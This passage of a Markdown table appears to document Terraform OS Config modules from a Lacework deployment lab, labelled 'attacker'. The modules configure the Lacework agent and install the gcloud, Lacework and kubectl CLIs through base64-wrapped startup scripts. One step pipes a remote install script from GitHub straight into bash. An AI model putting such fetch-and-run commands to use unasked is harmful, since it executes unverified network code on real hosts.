| attacker-osconfig-deploy-lacework-syscall-config        | ./modules/osconfig/deploy-lacework-syscall-config     | osconfig_deploy_lacework_syscall                | context.gcp.osconfig.deploy_lacework_syscall_config              | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "deploy_lacework_syscall_config": {<br/>                    "enabled": false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-lacework-syscall-config     | <pre>locals &&#35;123;<br/>    tool = &quot;lacework&#45;sycall&#45;config&quot;<br/>    lacework&&#35;95;install&&#35;95;path = &quot;/var/lib/lacework&quot;<br/>    lacework&&#35;95;syscall&&#35;95;config&&#35;95;path = &quot;$&&#35;123;local&#46;lacework&&#35;95;install&&#35;95;path&&#35;125;/config/syscall&&#35;95;config&#46;yaml&quot;<br/>    syscall&&#35;95;config = file&&#35;40;var&#46;inputs&&#35;91;&quot;syscall&&#35;95;config&quot;&&#35;93;&&#35;41;<br/>    base64&&#35;95;syscall&&#35;95;config = local&#46;syscall&&#35;95;config<br/>    hash&&#35;95;syscall&&#35;95;config = sha256&&#35;40;local&#46;syscall&&#35;95;config&&#35;41;<br/>    payload = &lt;&lt;&#45;EOT<br/>    LACEWORK&&#35;95;INSTALL&&#35;95;PATH=&quot;$&&#35;123;local&#46;lacework&&#35;95;install&&#35;95;path&&#35;125;&quot;<br/>    LACEWORK&&#35;95;SYSCALL&&#35;95;CONFIG&&#35;95;PATH=$&&#35;123;local&#46;lacework&&#35;95;syscall&&#35;95;config&&#35;95;path&&#35;125;<br/>    <br/>    &#35; Check if Lacework is pre&#45;installed&#46; If installed, add syscall&&#35;95;config&#46;yaml&#46;<br/>    if &&#35;91; &#45;f &quot;$LACEWORK&&#35;95;INSTALL&&#35;95;PATH/datacollector&quot; &&#35;93;; then<br/>        log &quot;Lacework agent is installed, adding syscall&&#35;95;config&#46;yaml&#46;&#46;&#46;&quot;<br/>        if echo &quot;$&&#35;123;local&#46;hash&&#35;95;syscall&&#35;95;config&&#35;125;  $LACEWORK&&#35;95;SYSCALL&&#35;95;CONFIG&&#35;95;PATH&quot; &#124; sha256sum &#45;&#45;check &#45;&#45;status; then <br/>            log &quot;Lacework syscall&&#35;95;config&#46;yaml unchanged&quot;; <br/>        else <br/>            log &quot;Lacework syscall&&#35;95;config&#46;yaml requires update&quot;<br/>            echo &#45;n &quot;$&&#35;123;base64gzip&&#35;40;local&#46;base64&&#35;95;syscall&&#35;95;config&&#35;41;&&#35;125;&quot; &#124; base64 &#45;d &#124; gunzip &gt; $LACEWORK&&#35;95;SYSCALL&&#35;95;CONFIG&&#35;95;PATH<br/>        fi<br/>        log &quot;Lacework agent is installed, adding disable aggregation config&#46;&#46;&#46;&quot;<br/>        file&&#35;95;path=&quot;/var/lib/lacework/config/config&#46;json&quot;<br/><br/>        log &quot;Checking for ebpf aggregate&&#35;95;events disabled&#46;&#46;&#46;&quot;<br/>        grep &#45;q &&#35;x27;&quot;ebpf&quot;&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;:&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;&&#35;123;&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;&quot;aggregate&&#35;95;events&quot;&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;:&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;&quot;false&quot;&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;&&#35;125;&&#35;x27; $file&&#35;95;path<br/>        if &&#35;91; $? &#45;ne 0 &&#35;93;; then<br/>            log &quot;ebpf aggregate&&#35;95;events not currently disabled&#46;&#46;&#46;&quot;<br/>            grep &#45;q &&#35;x27;&quot;ebpf&quot;&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;:&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;&&#35;123;&&#35;91;^&&#35;125;&&#35;93;&&#35;42;&&#35;125;&&#35;x27; $file&&#35;95;path<br/>            if &&#35;91; $? &#45;eq 0 &&#35;93;; then<br/>                log &quot;Found existing ebpf config &#45; updating&#46;&#46;&#46;&quot;<br/>                sed &#45;i &&#35;x27;s/&quot;ebpf&quot;&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;:&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;&&#35;123;&&#35;91;^&&#35;125;&&#35;93;&&#35;42;&&#35;125;/&quot;ebpf&quot;: &&#35;123;&quot;aggregate&&#35;95;events&quot;: &quot;false&quot;&&#35;125;/&&#35;x27; $file&&#35;95;path<br/>            else<br/>                log &quot;No existing ebpf config &#45; appending&#46;&#46;&#46;&quot;<br/>                sed &#45;i &&#35;x27;1s/&&#35;123;/&&#35;123;&&#35;92;n  &quot;ebpf&quot;: &&#35;123;&quot;aggregate&&#35;95;events&quot;: &quot;false&quot;&&#35;125;,/&&#35;x27; $file&&#35;95;path<br/>            fi<br/>        else<br/>            log &quot;ebpf aggregate&&#35;95;events already enabled&#46;&quot;<br/>        fi<br/>    fi<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        while &#33; &&#35;91; &#45;f /var/lib/lacework/config/config&#46;json &&#35;93;; do<br/>            log &quot;lacework installation not found &#45; waiting&quot;; <br/>            sleep 120;<br/>        done<br/>        EOT<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        while &#33; &&#35;91; &#45;f /var/lib/lacework/config/config&#46;json &&#35;93;; do<br/>            log &quot;lacework installation not found &#45; waiting&quot;; <br/>            sleep 120;<br/>        done<br/>        EOT<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| attacker-osconfig-deploy-lacework-code-aware-agent      | ./modules/osconfig/deploy-lacework-code-aware-agent   | osconfig_deploy_lacework_code_aware_agent       | context.gcp.osconfig.deploy_lacework_code_aware_agent            | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "deploy_lacework_code_aware_agent": {<br/>                    "enabled": false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-lacework-code-aware-agent   | <pre>locals &&#35;123;<br/>    tool = &quot;lacework&#45;codeware&#45;agent&quot;<br/>    lacework&&#35;95;install&&#35;95;path = &quot;/var/lib/lacework&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    LACEWORK&&#35;95;INSTALL&&#35;95;PATH=&quot;$&&#35;123;local&#46;lacework&&#35;95;install&&#35;95;path&&#35;125;&quot;  <br/>    <br/>    &#35; Check if Lacework is pre&#45;installed&#46; If installed, add code aware agent config&#46;<br/>    if &&#35;91; &#45;f &quot;$LACEWORK&&#35;95;INSTALL&&#35;95;PATH/datacollector&quot; &&#35;93;; then<br/>        log &quot;Lacework agent is installed, adding code aware agent config&#46;&#46;&#46;&quot;<br/>        file&&#35;95;path=&quot;/var/lib/lacework/config/config&#46;json&quot;<br/>        <br/>        log &quot;Checking for codeaware agent config enable&#46;&#46;&#46;&quot;<br/>        grep &#45;q &&#35;x27;&quot;codeaware&quot;&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;:&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;&&#35;123;&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;&quot;enable&quot;&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;:&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;&quot;all&quot;&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;&&#35;125;&&#35;x27; $file&&#35;95;path<br/>        if &&#35;91; $? &#45;ne 0 &&#35;93;; then<br/>            log &quot;Code aware agent not currently enabled&#46;&#46;&#46;&quot;<br/>            grep &#45;q &&#35;x27;&quot;codeaware&quot;&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;:&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;&&#35;123;&&#35;91;^&&#35;125;&&#35;93;&&#35;42;&&#35;125;&&#35;x27; $file&&#35;95;path<br/>            if &&#35;91; $? &#45;eq 0 &&#35;93;; then<br/>                log &quot;Found existing codeaware config &#45; updating&#46;&#46;&#46;&quot;<br/>                sed &#45;i &&#35;x27;s/&quot;codeaware&quot;&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;:&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;&&#35;123;&&#35;91;^&&#35;125;&&#35;93;&&#35;42;&&#35;125;/&quot;codeaware&quot;: &&#35;123;&quot;enable&quot;: &quot;all&quot;&&#35;125;/&&#35;x27; $file&&#35;95;path<br/>            else<br/>                log &quot;No existing codeaware config &#45; appending&#46;&#46;&#46;&quot;<br/>                sed &#45;i &&#35;x27;1s/&&#35;123;/&&#35;123;&&#35;92;n  &quot;codeaware&quot;: &&#35;123;&quot;enable&quot;: &quot;all&quot;&&#35;125;,/&&#35;x27; $file&&#35;95;path<br/>            fi<br/>        else<br/>            log &quot;Code aware agent config already enabled&#46;&quot;<br/>        fi<br/>    fi<br/>    log &quot;Done&quot;<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        while &#33; &&#35;91; &#45;f /var/lib/lacework/config/config&#46;json &&#35;93;; do<br/>            log &quot;lacework installation not found &#45; waiting&quot;; <br/>            sleep 120;<br/>        done<br/>        EOT<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        while &#33; &&#35;91; &#45;f /var/lib/lacework/config/config&#46;json &&#35;93;; do<br/>            log &quot;lacework installation not found &#45; waiting&quot;; <br/>            sleep 120;<br/>        done<br/>        EOT<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| attacker-osconfig-deploy-gcp-cli                        | ./modules/osconfig/deploy-gcp-cli                     | osconfig_deploy_gcp_cli                         | context.gcp.osconfig.deploy_gcp_cli                              | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "deploy_gcp_cli": {<br/>                    "enabled": false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-gcp-cli                     | <pre>locals &&#35;123;<br/>    tool = &quot;gcloud&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;Checking for $&&#35;123;local&#46;tool&&#35;125;&#46;&#46;&#46;&quot;<br/>    if &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>        log &quot;$&&#35;123;local&#46;tool&&#35;125; not found installation required&quot;<br/>    fi<br/>    log &quot;$&&#35;123;local&#46;tool&&#35;125; path: $&&#35;40;command &#45;v  $&&#35;123;local&#46;tool&&#35;125;&&#35;41;&quot;<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        if command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; found &#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        &#35; install gcloud<br/>        curl https://dl&#46;google&#46;com/dl/cloudsdk/channels/rapid/downloads/google&#45;cloud&#45;cli&#45;416&#46;0&#46;0&#45;linux&#45;x86&&#35;95;64&#46;tar&#46;gz &#45;LOJ &&#35;92;<br/>            &amp;&amp; tar &#45;xf google&#45;cloud&#45;cli&#45;416&#46;0&#46;0&#45;linux&#45;x86&&#35;95;64&#46;tar&#46;gz &&#35;92;<br/>            &amp;&amp; &#46;/google&#45;cloud&#45;sdk/install&#46;sh &#45;q<br/>        cat &gt;&gt; /etc/profile&#46;d/gcloud &lt;&lt;EOF<br/>        PATH=$PATH:/google&#45;cloud&#45;sdk/bin<br/>        EOF<br/>        gcloud components install gke&#45;gcloud&#45;auth&#45;plugin &#45;&#45;quiet<br/>        EOT<br/>        apt&&#35;95;packages = &quot;jq&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        if command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; found &#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        &#35; install gcloud<br/>        curl https://dl&#46;google&#46;com/dl/cloudsdk/channels/rapid/downloads/google&#45;cloud&#45;cli&#45;416&#46;0&#46;0&#45;linux&#45;x86&&#35;95;64&#46;tar&#46;gz &#45;LOJ &&#35;92;<br/>            &amp;&amp; tar &#45;xf google&#45;cloud&#45;cli&#45;416&#46;0&#46;0&#45;linux&#45;x86&&#35;95;64&#46;tar&#46;gz &&#35;92;<br/>            &amp;&amp; &#46;/google&#45;cloud&#45;sdk/install&#46;sh &#45;q<br/>        cat &gt;&gt; /etc/profile&#46;d/gcloud &lt;&lt;EOF<br/>        PATH=$PATH:/google&#45;cloud&#45;sdk/bin<br/>        EOF<br/>        gcloud components install gke&#45;gcloud&#45;auth&#45;plugin &#45;&#45;quiet<br/>        EOT<br/>        yum&&#35;95;packages = &quot;jq&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| attacker-osconfig-deploy-lacework-cli                   | ./modules/osconfig/deploy-lacework-cli                | osconfig_deploy_lacework_cli                    | context.gcp.osconfig.deploy_lacework_cli                         | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "deploy_lacework_cli": {<br/>                    "enabled": false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-lacework-cli                | <pre>locals &&#35;123;<br/>    tool=&quot;lacework&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;Checking for $&&#35;123;local&#46;tool&&#35;125;&#46;&#46;&#46;&quot;<br/>    if &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125;; then<br/>        log &quot;$&&#35;123;local&#46;tool&&#35;125; not found installation required&quot;<br/>        curl https://raw&#46;githubusercontent&#46;com/lacework/go&#45;sdk/main/cli/install&#46;sh &#124; bash<br/>    fi<br/>    log &quot;$&&#35;123;local&#46;tool&&#35;125; path: $&&#35;40;command &#45;v  $&&#35;123;local&#46;tool&&#35;125;&&#35;41;&quot;<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        if command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; found &#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        apt&&#35;95;packages = &quot;jq&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        if command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; found &#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        yum&&#35;95;packages = &quot;jq&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| attacker-osconfig-deploy-kubectl-cli                    | ./modules/osconfig/deploy-kubectl-cli                 | osconfig_deploy_kubectl_cli                     | context.gcp.osconfig.deploy_kubectl_cli                          | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "deploy_kubectl_cli": {<br/>                    "enabled": false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-kubectl-cli                 | <pre>locals &&#35;123;<br/>    tool=&quot;kubectl&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;Checking for $&&#35;123;local&#46;tool&&#35;125;&#46;&#46;&#46;&quot;<br/>    if &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125;; then<br/>        log &quot;$&&#35;123;local&#46;tool&&#35;125; not found installation required&quot;<br/>        curl &#45;LO &quot;https://storage&#46;googleapis&#46;com/kubernetes&#45;release/release/$&&#35;40;curl &#45;s https://storage&#46;googleapis&#46;com/kubernetes&#45;release/release/stable&#46;txt&&#35;41;/bin/linux/amd64/kubectl&quot;<br/>        sudo install &#45;o root &#45;g root &#45;m 0755 kubectl /usr/local/bin/kubectl<br/>    fi<br/>    log &quot;$&&#35;123;local&#46;tool&&#35;125; path: $&&#35;40;command &#45;v  $&&#35;123;local&#46;tool&&#35;125;&&#35;41;&quot;<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        if command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; found &#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        apt&&#35;95;packages = &quot;jq&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        if command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; found &#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        yum&&#35;95;packages = &quot;jq&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   